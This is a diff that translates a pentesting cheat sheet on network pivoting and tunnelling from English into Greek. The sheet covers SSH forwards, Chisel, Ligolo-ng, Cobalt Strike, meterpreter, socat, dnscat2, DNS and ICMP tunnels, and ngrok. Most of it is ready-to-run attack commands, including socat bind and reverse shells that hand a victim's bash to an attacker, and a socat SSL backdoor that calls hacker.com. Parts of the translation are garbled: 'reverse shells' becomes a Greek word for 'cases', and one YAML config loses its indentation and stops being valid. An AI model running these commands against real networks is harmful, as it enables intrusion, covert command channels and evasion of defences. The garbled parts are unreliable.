@@ -5,12 +5,11 @@
 ## Nmap tip
 
 > [!WARNING]
-> **ICMP** and **SYN** scans cannot be tunnelled through socks proxies, so we must **disable ping discovery** (`-Pn`) and specify **TCP scans** (`-sT`) for this to work.
+> **ICMP** και **SYN** σάρωσεις δεν μπορούν να περάσουν μέσω των socks proxies, οπότε πρέπει να **απενεργοποιήσουμε την ανακάλυψη ping** (`-Pn`) και να καθορίσουμε **TCP σάρωσεις** (`-sT`) για να λειτουργήσει αυτό.
 
 ## **Bash**
 
 **Host -> Jump -> InternalA -> InternalB**
-
 ```bash
 # On the jump server connect the port 3333 to the 5985
 mknod backpipe p;
@@ -26,19 +25,15 @@ cat <&4 >&3 &
 # From the host, you can now access InternalB from the Jump server
 evil-winrm -u username -i Jump
 ```
-
 ## **SSH**
 
-SSH graphical connection (X)
-
+SSH γραφική σύνδεση (X)
 ```bash
 ssh -Y -C <user>@<ip> #-Y is less secure but faster than -X
 ```
+### Τοπικό Port2Port
 
-### Local Port2Port
-
-Open new Port in SSH Server --> Other port
-
+Άνοιγμα νέας Θύρας στον SSH Server --> Άλλη θύρα
 ```bash
 ssh -R 0.0.0.0:10521:127.0.0.1:1521 user@10.0.0.1 #Local port 1521 accessible in port 10521 from everywhere
 ```
@@ -46,29 +41,23 @@ ssh -R 0.0.0.0:10521:127.0.0.1:1521 user@10.0.0.1 #Local port 1521 accessible in
 ```bash
 ssh -R 0.0.0.0:10521:10.0.0.1:1521 user@10.0.0.1 #Remote port 1521 accessible in port 10521 from everywhere
 ```
-
 ### Port2Port
 
-Local port --> Compromised host (SSH) --> Third_box:Port
-
+Τοπική θύρα --> Συμβιβασμένος υπολογιστής (SSH) --> Τρίτο_κουτί:Θύρα
 ```bash
 ssh -i ssh_key <user>@<ip_compromised> -L <attacker_port>:<ip_victim>:<remote_port> [-p <ssh_port>] [-N -f]  #This way the terminal is still in your host
 #Example
 sudo ssh -L 631:<ip_victim>:631 -N -f -l <username> <ip_compromised>
 ```
-
 ### Port2hostnet (proxychains)
 
-Local Port --> Compromised host (SSH) --> Wherever
-
+Τοπική Θύρα --> Συμβιβασμένος υπολογιστής (SSH) --> Οπουδήποτε
 ```bash
 ssh -f -N -D <attacker_port> <username>@<ip_compromised> #All sent to local port will exit through the compromised server (use as proxy)
 ```
+### Αντίστροφη Προώθηση Θυρών
 
-### Reverse Port Forwarding
-
-This is useful to get reverse shells from internal hosts through a DMZ to your host:
-
+Αυτό είναι χρήσιμο για να αποκτήσετε αντίστροφες θήκες από εσωτερικούς υπολογιστές μέσω μιας DMZ στον υπολογιστή σας:
 ```bash
 ssh -i dmz_key -R <dmz_internal_ip>:443:0.0.0.0:7000 root@10.129.203.111 -vN
 # Now you can send a rev to dmz_internal_ip:443 and capture it in localhost:7000
@@ -77,13 +66,11 @@ ssh -i dmz_key -R <dmz_internal_ip>:443:0.0.0.0:7000 root@10.129.203.111 -vN
 # and change the line "GatewayPorts no" to "GatewayPorts yes"
 # to be able to make ssh listen in non internal interfaces in the victim (443 in this case)
 ```
-
 ### VPN-Tunnel
 
-You need **root in both devices** (as you are going to create new interfaces) and the sshd config has to allow root login:\
+Χρειάζεστε **root και στις δύο συσκευές** (καθώς πρόκειται να δημιουργήσετε νέες διεπαφές) και η ρύθμιση sshd πρέπει να επιτρέπει την είσοδο root:\
 `PermitRootLogin yes`\
 `PermitTunnel yes`
-
 ```bash
 ssh root@server -w any:any #This will create Tun interfaces in both devices
 ip addr add 1.1.1.2/32 peer 1.1.1.1 dev tun0 #Client side VPN IP
@@ -91,50 +78,38 @@ ifconfig tun0 up #Activate the client side network interface
 ip addr add 1.1.1.1/32 peer 1.1.1.2 dev tun0 #Server side VPN IP
 ifconfig tun0 up #Activate the server side network interface
 ```
-
-Enable forwarding on the Server side
-
+Ενεργοποιήστε την προώθηση στην πλευρά του διακομιστή
 ```bash
 echo 1 > /proc/sys/net/ipv4/ip_forward
 iptables -t nat -A POSTROUTING -s 1.1.1.2 -o eth0 -j MASQUERADE
 ```
-
-Set a new route on the client side
-
+Ορίστε μια νέα διαδρομή στην πλευρά του πελάτη
 ```
 route add -net 10.0.0.0/16 gw 1.1.1.1
 ```
-
 ## SSHUTTLE
 
-You can **tunnel** via **ssh** all the **traffic** to a **subnetwork** through a host.\
-For example, forwarding all the traffic going to 10.10.10.0/24
-
+Μπορείτε να **tunnel** μέσω **ssh** όλη την **κίνηση** σε ένα **υποδίκτυο** μέσω ενός host.\
+Για παράδειγμα, προωθώντας όλη την κίνηση που πηγαίνει στο 10.10.10.0/24
 ```bash
 pip install sshuttle
 sshuttle -r user@host 10.10.10.10/24
 ```
-
-Connect with a private key
-
+Συνδεθείτε με ένα ιδιωτικό κλειδί
 ```bash
 sshuttle -D -r user@host 10.10.10.10 0/0 --ssh-cmd 'ssh -i ./id_rsa'
 # -D : Daemon mode
 ```
-
 ## Meterpreter
 
 ### Port2Port
 
-Local port --> Compromised host (active session) --> Third_box:Port
-
+Τοπική θύρα --> Συμβιβασμένος υπολογιστής (ενεργή συνεδρία) --> Τρίτο_κουτί:Θύρα
 ```bash
 # Inside a meterpreter session
 portfwd add -l <attacker_port> -p <Remote_port> -r <Remote_host>
 ```
-
 ### SOCKS
-
 ```bash
 background# meterpreter session
 route add <IP_victim> <Netmask> <Session> # (ex: route add 10.10.10.14 255.255.255.0 8)
@@ -142,9 +117,7 @@ use auxiliary/server/socks_proxy
 run #Proxy port 1080 by default
 echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
 ```
-
-Another way:
-
+Άλλος τρόπος:
 ```bash
 background #meterpreter session
 use post/multi/manage/autoroute
@@ -157,13 +130,11 @@ set VERSION 4a
 run #Proxy port 1080 by default
 echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
 ```
-
 ## Cobalt Strike
 
 ### SOCKS proxy
 
-Open a port in the teamserver listening in all the interfaces that can be used to **route the traffic through the beacon**.
-
+Ανοίξτε μια θύρα στον server της ομάδας που ακούει σε όλα τα interfaces που μπορούν να χρησιμοποιηθούν για να **δρομολογήσουν την κίνηση μέσω του beacon**.
 ```bash
 beacon> socks 1080
 [+] started SOCKS4a server on: 1080
@@ -171,50 +142,42 @@ beacon> socks 1080
 # Set port 1080 as proxy server in proxychains.conf
 proxychains nmap -n -Pn -sT -p445,3389,5985 10.10.17.25
 ```
-
 ### rPort2Port
 
 > [!WARNING]
-> In this case, the **port is opened in the beacon host**, not in the Team Server and the traffic is sent to the Team Server and from there to the indicated host:port
-
+> Σε αυτή την περίπτωση, το **θύρα είναι ανοιχτή στον host beacon**, όχι στον Team Server και η κίνηση αποστέλλεται στον Team Server και από εκεί στον υποδεικνυόμενο host:port
 ```bash
 rportfwd [bind port] [forward host] [forward port]
 rportfwd stop [bind port]
 ```
+Για σημείωση:
 
-To note:
+- Η αντίστροφη προώθηση θύρας του Beacon έχει σχεδιαστεί για να **συνδέει την κίνηση στον Team Server, όχι για αναμετάδοση μεταξύ μεμονωμένων μηχανών**.
+- Η κίνηση είναι **συνδεδεμένη μέσα στην κίνηση C2 του Beacon**, συμπεριλαμβανομένων των P2P συνδέσεων.
+- **Δικαιώματα διαχειριστή δεν απαιτούνται** για τη δημιουργία αντίστροφων προωθήσεων θύρας σε υψηλές θύρες.
 
-- Beacon's reverse port forward is designed to **tunnel traffic to the Team Server, not for relaying between individual machines**.
-- Traffic is **tunneled within Beacon's C2 traffic**, including P2P links.
-- **Admin privileges are not required** to create reverse port forwards on high ports.
-
-### rPort2Port local
+### rPort2Port τοπικά
 
 > [!WARNING]
-> In this case, the **port is opened in the beacon host**, not in the Team Server and the **traffic is sent to the Cobalt Strike client** (not to the Team Server) and from there to the indicated host:port
-
+> Σε αυτή την περίπτωση, η **θύρα ανοίγεται στον υπολογιστή beacon**, όχι στον Team Server και η **κίνηση αποστέλλεται στον πελάτη Cobalt Strike** (όχι στον Team Server) και από εκεί στον καθορισμένο host:port
 ```
 rportfwd_local [bind port] [forward host] [forward port]
 rportfwd_local stop [bind port]
 ```
-
 ## reGeorg
 
 [https://github.com/sensepost/reGeorg](https://github.com/sensepost/reGeorg)
 
-You need to upload a web file tunnel: ashx|aspx|js|jsp|php|php|jsp
-
+Πρέπει να ανεβάσετε ένα αρχείο ιστού tunnel: ashx|aspx|js|jsp|php|php|jsp
 ```bash
 python reGeorgSocksProxy.py -p 8080 -u http://upload.sensepost.net:8080/tunnel/tunnel.jsp
 ```
-
 ## Chisel
 
-You can download it from the releases page of [https://github.com/jpillora/chisel](https://github.com/jpillora/chisel)\
-You need to use the **same version for client and server**
+Μπορείτε να το κατεβάσετε από τη σελίδα εκδόσεων του [https://github.com/jpillora/chisel](https://github.com/jpillora/chisel)\
+Πρέπει να χρησιμοποιήσετε την **ίδια έκδοση για τον πελάτη και τον διακομιστή**
 
 ### socks
-
 ```bash
 ./chisel server -p 8080 --reverse #Server -- Attacker
 ./chisel-x64.exe client 10.10.14.3:8080 R:socks #Client -- Victim
@@ -223,22 +186,18 @@ You need to use the **same version for client and server**
 ./chisel server -v -p 8080 --socks5 #Server -- Victim (needs to have port 8080 exposed)
 ./chisel client -v 10.10.10.10:8080 socks #Attacker
 ```
-
-### Port forwarding
-
+### Προώθηση θύρας
 ```bash
 ./chisel_1.7.6_linux_amd64 server -p 12312 --reverse #Server -- Attacker
 ./chisel_1.7.6_linux_amd64 client 10.10.14.20:12312 R:4505:127.0.0.1:4505 #Client -- Victim
 ```
-
 ## Ligolo-ng
 
 [https://github.com/nicocha30/ligolo-ng](https://github.com/nicocha30/ligolo-ng)
 
-**Use the same version for agent and proxy**
+**Χρησιμοποιήστε την ίδια έκδοση για τον πράκτορα και τον μεσολαβητή**
 
 ### Tunneling
-
 ```bash
 # Start proxy server and automatically generate self-signed TLS certificates -- Attacker
 sudo ./proxy -selfcert
@@ -260,9 +219,7 @@ interface_add_route --name "ligolo" --route <network_address_agent>/<netmask_age
 # Display the tun interfaces -- Attacker
 interface_list
 ```
-
-### Agent Binding and Listening
-
+### Σύνδεση και Ακρόαση
 ```bash
 # Establish a tunnel from the proxy server to the agent
 # Create a TCP listening socket on the agent (0.0.0.0) on port 30000 and forward incoming TCP connections to the proxy (127.0.0.1) on port 10000 -- Attacker
@@ -270,22 +227,18 @@ listener_add --addr 0.0.0.0:30000 --to 127.0.0.1:10000 --tcp
 # Display the currently running listeners on the agent -- Attacker
 listener_list
 ```
-
-### Access Agent's Local Ports
-
+### Πρόσβαση στους Τοπικούς Θύρες του Πράκτορα
 ```bash
 # Establish a tunnel from the proxy server to the agent
 # Create a route to redirect traffic for 240.0.0.1 to the Ligolo-ng interface to access the agent's local services -- Attacker
 interface_add_route --name "ligolo" --route 240.0.0.1/32
 ```
-
 ## Rpivot
 
 [https://github.com/klsecservices/rpivot](https://github.com/klsecservices/rpivot)
 
-Reverse tunnel. The tunnel is started from the victim.\
-A socks4 proxy is created on 127.0.0.1:1080
-
+Αντίστροφη σήραγγα. Η σήραγγα ξεκινά από το θύμα.\
+Δημιουργείται ένα socks4 proxy στο 127.0.0.1:1080
 ```bash
 attacker> python server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127.0.0.1 --proxy-port 1080
 ```
@@ -293,9 +246,7 @@ attacker> python server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127
 ```bash
 victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999
 ```
-
-Pivot through **NTLM proxy**
-
+Περιστροφή μέσω **NTLM proxy**
 ```bash
 victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --password P@ssw0rd
 ```
@@ -303,39 +254,29 @@ victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntl
 ```bash
 victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --hashes 9b9850751be2515c8231e5189015bbe6:49ef7638d69a01f26d96ed673bf50c45
 ```
-
 ## **Socat**
 
 [https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries)
 
-### Bind shell
-
+### Δεσμευμένο κέλυφος
 ```bash
 victim> socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
 attacker> socat FILE:`tty`,raw,echo=0 TCP4:<victim_ip>:1337
 ```
-
-### Reverse shell
-
+### Αντίστροφη θήκη
 ```bash
 attacker> socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0
 victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
 ```
-
 ### Port2Port
-
 ```bash
 socat TCP4-LISTEN:<lport>,fork TCP4:<redirect_ip>:<rport> &
 ```
-
-### Port2Port through socks
-
+### Port2Port μέσω socks
 ```bash
 socat TCP4-LISTEN:1234,fork SOCKS4A:127.0.0.1:google.com:80,socksport=5678
 ```
-
-### Meterpreter through SSL Socat
-
+### Meterpreter μέσω SSL Socat
 ```bash
 #Create meterpreter backdoor to port 3333 and start msfconsole listener in that port
 attacker> socat OPENSSL-LISTEN:443,cert=server.pem,cafile=client.crt,reuseaddr,fork,verify=1 TCP:127.0.0.1:3333
@@ -345,21 +286,17 @@ attacker> socat OPENSSL-LISTEN:443,cert=server.pem,cafile=client.crt,reuseaddr,f
 victim> socat.exe TCP-LISTEN:2222 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|TCP:hacker.com:443,connect-timeout=5
 #Execute the meterpreter
 ```
-
-You can bypass a **non-authenticated proxy** executing this line instead of the last one in the victim's console:
-
+Μπορείτε να παρακάμψετε έναν **μη αυθεντικοποιημένο διακομιστή μεσολάβησης** εκτελώντας αυτή τη γραμμή αντί για την τελευταία στην κονσόλα του θύματος:
 ```bash
 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacker.com:443,connect-timeout=5|TCP:proxy.lan:8080,connect-timeout=5
 ```
-
 [https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/](https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/)
 
 ### SSL Socat Tunnel
 
-**/bin/sh console**
+**/bin/sh κονσόλα**
 
-Create certificates on both sides: Client and Server
-
+Δημιουργήστε πιστοποιητικά και στις δύο πλευρές: Πελάτης και Διακομιστής
 ```bash
 # Execute these commands on both sides
 FILENAME=socatssl
@@ -373,34 +310,28 @@ chmod 600 $FILENAME.key $FILENAME.pem
 attacker-listener> socat OPENSSL-LISTEN:433,reuseaddr,cert=server.pem,cafile=client.crt EXEC:/bin/sh
 victim> socat STDIO OPENSSL-CONNECT:localhost:433,cert=client.pem,cafile=server.crt
 ```
-
 ### Remote Port2Port
 
-Connect the local SSH port (22) to the 443 port of the attacker host
-
+Συνδέστε την τοπική θύρα SSH (22) με την θύρα 443 του επιτιθέμενου host
 ```bash
 attacker> sudo socat TCP4-LISTEN:443,reuseaddr,fork TCP4-LISTEN:2222,reuseaddr #Redirect port 2222 to port 443 in localhost
 victim> while true; do socat TCP4:<attacker>:443 TCP4:127.0.0.1:22 ; done # Establish connection with the port 443 of the attacker and everything that comes from here is redirected to port 22
 attacker> ssh localhost -p 2222 -l www-data -i vulnerable #Connects to the ssh of the victim
 ```
-
 ## Plink.exe
 
-It's like a console PuTTY version ( the options are very similar to an ssh client).
+Είναι σαν μια κονσόλα PuTTY έκδοση (οι επιλογές είναι πολύ παρόμοιες με έναν ssh πελάτη).
 
-As this binary will be executed in the victim and it is an ssh client, we need to open our ssh service and port so we can have a reverse connection. Then, to forward only locally accessible port to a port in our machine:
-
+Καθώς αυτό το δυαδικό αρχείο θα εκτελείται στο θύμα και είναι ένας ssh πελάτης, πρέπει να ανοίξουμε την υπηρεσία ssh και την θύρα μας ώστε να μπορέσουμε να έχουμε μια αντίστροφη σύνδεση. Στη συνέχεια, για να προωθήσουμε μόνο την τοπικά προσβάσιμη θύρα σε μια θύρα στη μηχανή μας:
 ```bash
 echo y | plink.exe -l <Our_valid_username> -pw <valid_password> [-p <port>] -R <port_ in_our_host>:<next_ip>:<final_port> <your_ip>
 echo y | plink.exe -l root -pw password [-p 2222] -R 9090:127.0.0.1:9090 10.11.0.41 #Local port 9090 to out port 9090
 ```
-
 ## Windows netsh
 
 ### Port2Port
 
-You need to be a local admin (for any port)
-
+Πρέπει να είστε τοπικός διαχειριστής (για οποιαδήποτε θύρα)
 ```bash
 netsh interface portproxy add v4tov4 listenaddress= listenport= connectaddress= connectport= protocol=tcp
 # Example:
@@ -410,60 +341,50 @@ netsh interface portproxy show v4tov4
 # Delete port forward
 netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
 ```
-
 ## SocksOverRDP & Proxifier
 
-You need to have **RDP access over the system**.\
-Download:
+Πρέπει να έχετε **πρόσβαση RDP στο σύστημα**.\
+Κατεβάστε:
 
-1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases) - This tool uses `Dynamic Virtual Channels` (`DVC`) from the Remote Desktop Service feature of Windows. DVC is responsible for **tunneling packets over the RDP connection**.
+1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases) - Αυτό το εργαλείο χρησιμοποιεί `Dynamic Virtual Channels` (`DVC`) από τη δυνατότητα Remote Desktop Service των Windows. Το DVC είναι υπεύθυνο για **την αποστολή πακέτων μέσω της σύνδεσης RDP**.
 2. [Proxifier Portable Binary](https://www.proxifier.com/download/#win-tab)
 
-In your client computer load **`SocksOverRDP-Plugin.dll`** like this:
-
+Στον υπολογιστή-πελάτη σας, φορτώστε **`SocksOverRDP-Plugin.dll`** όπως αυτό:
 ```bash
 # Load SocksOverRDP.dll using regsvr32.exe
 C:\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
 ```
+Τώρα μπορούμε να **συνδεθούμε** με το **θύμα** μέσω **RDP** χρησιμοποιώντας **`mstsc.exe`**, και θα πρέπει να λάβουμε μια **ειδοποίηση** που λέει ότι το **SocksOverRDP plugin είναι ενεργοποιημένο**, και θα **ακούει** στη διεύθυνση **127.0.0.1:1080**.
 
-Now we can **connect** to the **victim** over **RDP** using **`mstsc.exe`**, and we should receive a **prompt** saying that the **SocksOverRDP plugin is enabled**, and it will **listen** on **127.0.0.1:1080**.
-
-**Connect** via **RDP** and upload & execute in the victim machine the `SocksOverRDP-Server.exe` binary:
-
+**Συνδεθείτε** μέσω **RDP** και ανεβάστε & εκτελέστε στο μηχάνημα του θύματος το δυαδικό αρχείο `SocksOverRDP-Server.exe`:
 ```
 C:\SocksOverRDP-x64> SocksOverRDP-Server.exe
 ```
-
-Now, confirm in you machine (attacker) that the port 1080 is listening:
-
+Τώρα, επιβεβαιώστε στη μηχανή σας (επιτιθέμενος) ότι η θύρα 1080 ακούει:
 ```
 netstat -antb | findstr 1080
 ```
+Τώρα μπορείτε να χρησιμοποιήσετε [**Proxifier**](https://www.proxifier.com/) **για να προξενήσετε την κίνηση μέσω αυτού του πόρου.**
 
-Now you can use [**Proxifier**](https://www.proxifier.com/) **to proxy the traffic through that port.**
+## Προξενήστε εφαρμογές Windows GUI
 
-## Proxify Windows GUI Apps
+Μπορείτε να κάνετε τις εφαρμογές Windows GUI να περιηγούνται μέσω ενός proxy χρησιμοποιώντας [**Proxifier**](https://www.proxifier.com/).\
+Στο **Profile -> Proxy Servers** προσθέστε τη διεύθυνση IP και τον πόρο του διακομιστή SOCKS.\
+Στο **Profile -> Proxification Rules** προσθέστε το όνομα του προγράμματος που θέλετε να προξενήσετε και τις συνδέσεις προς τις διευθύνσεις IP που θέλετε να προξενήσετε.
 
-You can make Windows GUI apps navigate through a proxy using [**Proxifier**](https://www.proxifier.com/).\
-In **Profile -> Proxy Servers** add the IP and port of the SOCKS server.\
-In **Profile -> Proxification Rules** add the name of the program to proxify and the connections to the IPs you want to proxify.
+## Παράκαμψη proxy NTLM
 
-## NTLM proxy bypass
-
-The previously mentioned tool: **Rpivot**\
-**OpenVPN** can also bypass it, setting these options in the configuration file:
-
+Το εργαλείο που αναφέρθηκε προηγουμένως: **Rpivot**\
+**OpenVPN** μπορεί επίσης να το παρακάμψει, ρυθμίζοντας αυτές τις επιλογές στο αρχείο ρύθμισης.
 ```bash
 http-proxy <proxy_ip> 8080 <file_with_creds> ntlm
 ```
-
 ### Cntlm
 
 [http://cntlm.sourceforge.net/](http://cntlm.sourceforge.net/)
 
-It authenticates against a proxy and binds a port locally that is forwarded to the external service you specify. Then, you can use the tool of your choice through this port.\
-For example that forward port 443
-
+Αυθεντικοποιεί έναν proxy και δεσμεύει μια θύρα τοπικά που προωθείται στην εξωτερική υπηρεσία που καθορίζετε. Στη συνέχεια, μπορείτε να χρησιμοποιήσετε το εργαλείο της επιλογής σας μέσω αυτής της θύρας.\
+Για παράδειγμα, προωθήστε τη θύρα 443
 ```
 Username Alice
 Password P@ssw0rd
@@ -471,13 +392,12 @@ Domain CONTOSO.COM
 Proxy 10.0.0.10:8080
 Tunnel 2222:<attackers_machine>:443
 ```
-
-Now, if you set for example in the victim the **SSH** service to listen in port 443. You can connect to it through the attacker port 2222.\
-You could also use a **meterpreter** that connects to localhost:443 and the attacker is listening in port 2222.
+Τώρα, αν ρυθμίσετε για παράδειγμα στο θύμα την υπηρεσία **SSH** να ακούει στην πόρτα 443. Μπορείτε να συνδεθείτε σε αυτή μέσω της θύρας του επιτιθέμενου 2222.\
+Μπορείτε επίσης να χρησιμοποιήσετε ένα **meterpreter** που συνδέεται στο localhost:443 και ο επιτιθέμενος ακούει στην πόρτα 2222.
 
 ## YARP
 
-A reverse proxy created by Microsoft. You can find it here: [https://github.com/microsoft/reverse-proxy](https://github.com/microsoft/reverse-proxy)
+Ένας αντίστροφος διακομιστής που δημιουργήθηκε από τη Microsoft. Μπορείτε να τον βρείτε εδώ: [https://github.com/microsoft/reverse-proxy](https://github.com/microsoft/reverse-proxy)
 
 ## DNS Tunneling
 
@@ -485,26 +405,21 @@ A reverse proxy created by Microsoft. You can find it here: [https://github.com/
 
 [https://code.kryo.se/iodine/](https://code.kryo.se/iodine/)
 
-Root is needed in both systems to create tun adapters and tunnel data between them using DNS queries.
-
+Απαιτείται root και στα δύο συστήματα για να δημιουργηθούν tun adapters και να μεταφερθούν δεδομένα μεταξύ τους χρησιμοποιώντας DNS queries.
 ```
 attacker> iodined -f -c -P P@ssw0rd 1.1.1.1 tunneldomain.com
 victim> iodine -f -P P@ssw0rd tunneldomain.com -r
 #You can see the victim at 1.1.1.2
 ```
-
-The tunnel will be very slow. You can create a compressed SSH connection through this tunnel by using:
-
+Ο σωλήνας θα είναι πολύ αργός. Μπορείτε να δημιουργήσετε μια συμπιεσμένη σύνδεση SSH μέσω αυτού του σωλήνα χρησιμοποιώντας:
 ```
 ssh <user>@1.1.1.2 -C -c blowfish-cbc,arcfour -o CompressionLevel=9 -D 1080
 ```
-
 ### DNSCat2
 
-[**Download it from here**](https://github.com/iagox86/dnscat2)**.**
+[**Κατεβάστε το από εδώ**](https://github.com/iagox86/dnscat2)**.**
 
-Establishes a C\&C channel through DNS. It doesn't need root privileges.
-
+Δημιουργεί ένα κανάλι C\&C μέσω DNS. Δεν απαιτεί δικαιώματα root.
 ```bash
 attacker> ruby ./dnscat2.rb tunneldomain.com
 victim> ./dnscat2 tunneldomain.com
@@ -513,28 +428,23 @@ victim> ./dnscat2 tunneldomain.com
 attacker> ruby dnscat2.rb --dns host=10.10.10.10,port=53,domain=mydomain.local --no-cache
 victim> ./dnscat2 --dns host=10.10.10.10,port=5353
 ```
+#### **Στο PowerShell**
 
-#### **In PowerShell**
-
-You can use [**dnscat2-powershell**](https://github.com/lukebaggett/dnscat2-powershell) to run a dnscat2 client in powershell:
-
+Μπορείτε να χρησιμοποιήσετε [**dnscat2-powershell**](https://github.com/lukebaggett/dnscat2-powershell) για να εκτελέσετε έναν πελάτη dnscat2 στο powershell:
 ```
 Import-Module .\dnscat2.ps1
 Start-Dnscat2 -DNSserver 10.10.10.10 -Domain mydomain.local -PreSharedSecret somesecret -Exec cmd
 ```
-
-#### **Port forwarding with dnscat**
-
+#### **Προώθηση θυρών με dnscat**
 ```bash
 session -i <sessions_id>
 listen [lhost:]lport rhost:rport #Ex: listen 127.0.0.1:8080 10.0.0.20:80, this bind 8080port in attacker host
 ```
+#### Αλλαγή DNS του proxychains
 
-#### Change proxychains DNS
+Το Proxychains παρεμβαίνει στην κλήση `gethostbyname` της libc και στέλνει τα αιτήματα DNS tcp μέσω του socks proxy. Από **προεπιλογή**, ο **DNS** διακομιστής που χρησιμοποιεί το proxychains είναι **4.2.2.2** (σκληρά κωδικοποιημένος). Για να τον αλλάξετε, επεξεργαστείτε το αρχείο: _/usr/lib/proxychains3/proxyresolv_ και αλλάξτε τη διεύθυνση IP. Αν βρίσκεστε σε **περιβάλλον Windows**, μπορείτε να ορίσετε τη διεύθυνση IP του **domain controller**.
 
-Proxychains intercepts `gethostbyname` libc call and tunnels tcp DNS request through the socks proxy. By **default** the **DNS** server that proxychains use is **4.2.2.2** (hardcoded). To change it, edit the file: _/usr/lib/proxychains3/proxyresolv_ and change the IP. If you are in a **Windows environment** you could set the IP of the **domain controller**.
-
-## Tunnels in Go
+## Τούνελ σε Go
 
 [https://github.com/hotnops/gtunnel](https://github.com/hotnops/gtunnel)
 
@@ -545,18 +455,15 @@ Proxychains intercepts `gethostbyname` libc call and tunnels tcp DNS request thr
 [https://github.com/friedrich/hans](https://github.com/friedrich/hans)\
 [https://github.com/albertzak/hanstunnel](https://github.com/albertzak/hanstunnel)
 
-Root is needed in both systems to create tun adapters and tunnel data between them using ICMP echo requests.
-
+Απαιτείται root και στα δύο συστήματα για να δημιουργηθούν οι προσαρμογείς tun και να μεταφερθούν δεδομένα μεταξύ τους χρησιμοποιώντας αιτήματα ICMP echo.
 ```bash
 ./hans -v -f -s 1.1.1.1 -p P@ssw0rd #Start listening (1.1.1.1 is IP of the new vpn connection)
 ./hans -f -c <server_ip> -p P@ssw0rd -v
 ping 1.1.1.100 #After a successful connection, the victim will be in the 1.1.1.100
 ```
-
 ### ptunnel-ng
 
-[**Download it from here**](https://github.com/utoni/ptunnel-ng.git).
-
+[**Κατεβάστε το από εδώ**](https://github.com/utoni/ptunnel-ng.git).
 ```bash
 # Generate it
 sudo ./autogen.sh
@@ -570,32 +477,28 @@ ssh -p 2222 -l user 127.0.0.1
 # Create a socks proxy through the SSH connection through the ICMP tunnel
 ssh -D 9050 -p 2222 -l user 127.0.0.1
 ```
-
 ## ngrok
 
-[**ngrok**](https://ngrok.com/) **is a tool to expose solutions to Internet in one command line.**\
-&#xNAN;_&#x45;xposition URI are like:_ **UID.ngrok.io**
+[**ngrok**](https://ngrok.com/) **είναι ένα εργαλείο για να εκθέτει λύσεις στο Διαδίκτυο με μία γραμμή εντολής.**\
+&#xNAN;_&#x45;xposition URI είναι όπως:_ **UID.ngrok.io**
 
-### Installation
+### Εγκατάσταση
 
-- Create an account: https://ngrok.com/signup
-- Client download:
-
+- Δημιουργήστε έναν λογαριασμό: https://ngrok.com/signup
+- Λήψη πελάτη:
 ```bash
 tar xvzf ~/Downloads/ngrok-v3-stable-linux-amd64.tgz -C /usr/local/bin
 chmod a+x ./ngrok
 # Init configuration, with your token
 ./ngrok config edit
 ```
+### Βασικές χρήσεις
 
-### Basic usages
+**Τεκμηρίωση:** [https://ngrok.com/docs/getting-started/](https://ngrok.com/docs/getting-started/).
 
-**Documentation:** [https://ngrok.com/docs/getting-started/](https://ngrok.com/docs/getting-started/).
+_Είναι επίσης δυνατή η προσθήκη αυθεντικοποίησης και TLS, αν είναι απαραίτητο._
 
-_It is also possible to add authentication and TLS, if necessary._
-
-#### Tunneling TCP
-
+#### Τούνελινγκ TCP
 ```bash
 # Pointing to 0.0.0.0:4444
 ./ngrok tcp 4444
@@ -603,49 +506,42 @@ _It is also possible to add authentication and TLS, if necessary._
 # Listen (example): nc -nvlp 4444
 # Remote connect (example): nc $(dig +short 0.tcp.ngrok.io) 12345
 ```
-
-#### Exposing files with HTTP
-
+#### Έκθεση αρχείων με HTTP
 ```bash
 ./ngrok http file:///tmp/httpbin/
 # Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
 ```
-
 #### Sniffing HTTP calls
 
-_Useful for XSS,SSRF,SSTI ..._\
-Directly from stdout or in the HTTP interface [http://127.0.0.1:4040](http://127.0.0.1:4000).
+_Χρήσιμο για XSS, SSRF, SSTI ..._\
+Άμεσα από το stdout ή στη διεπαφή HTTP [http://127.0.0.1:4040](http://127.0.0.1:4000).
 
 #### Tunneling internal HTTP service
-
 ```bash
 ./ngrok http localhost:8080 --host-header=rewrite
 # Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
 # With basic auth
 ./ngrok http localhost:8080 --host-header=rewrite --auth="myuser:mysuperpassword"
 ```
+#### ngrok.yaml απλή διαμόρφωση παράδειγμα
 
-#### ngrok.yaml simple configuration example
-
-It opens 3 tunnels:
+Ανοίγει 3 τούνελ:
 
 - 2 TCP
-- 1 HTTP with static files exposition from /tmp/httpbin/
-
+- 1 HTTP με στατική έκθεση αρχείων από /tmp/httpbin/
 ```yaml
 tunnels:
-  mytcp:
-    addr: 4444
-    proto: tcptunne
-  anothertcp:
-    addr: 5555
-    proto: tcp
-  httpstatic:
-    proto: http
-    addr: file:///tmp/httpbin/
+mytcp:
+addr: 4444
+proto: tcptunne
+anothertcp:
+addr: 5555
+proto: tcp
+httpstatic:
+proto: http
+addr: file:///tmp/httpbin/
 ```
-
-## Other tools to check
+## Άλλα εργαλεία για έλεγχο
 
